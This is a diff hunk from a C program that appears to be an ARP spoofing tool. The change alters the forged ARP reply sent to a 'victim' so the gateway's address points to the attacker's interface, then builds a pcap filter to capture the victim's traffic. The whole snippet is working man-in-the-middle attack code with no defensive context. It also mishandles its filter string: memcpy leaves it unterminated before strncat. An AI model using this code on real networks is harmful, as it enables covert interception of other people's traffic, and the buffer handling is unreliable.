@@ -80,13 +80,14 @@ int main(int argc, char *argv[]) {
     printf("\n");
     /* 4. send false arp packet to the victim */
     printf("arp spoof start...\n");
-    //send_arp_packet(handler, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
-    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
+    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+    //send_arp_packet(handler, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
     printf("\n");
     /* 5. listen to victim's packet afterwards */
     char *filter_string = (char *) malloc((strlen(filter) + strlen(argv[2]) + 1));
     memcpy(filter_string, filter, strlen(filter));
-    strncat(filter_string, inet_ntoa(my_arp.gateway_ip), strlen(inet_ntoa(my_arp.gateway_ip)));
+    //strncat(filter_string, inet_ntoa(my_arp.gateway_ip), strlen(inet_ntoa(my_arp.gateway_ip)));
+    strncat(filter_string, argv[2], strlen(argv[2]));
     printf("wait the hooking...\n");
     printf("the filter is %s\n", filter_string);
     if(pcap_compile(handler, &fp, filter_string, 0, netp) == -1) {
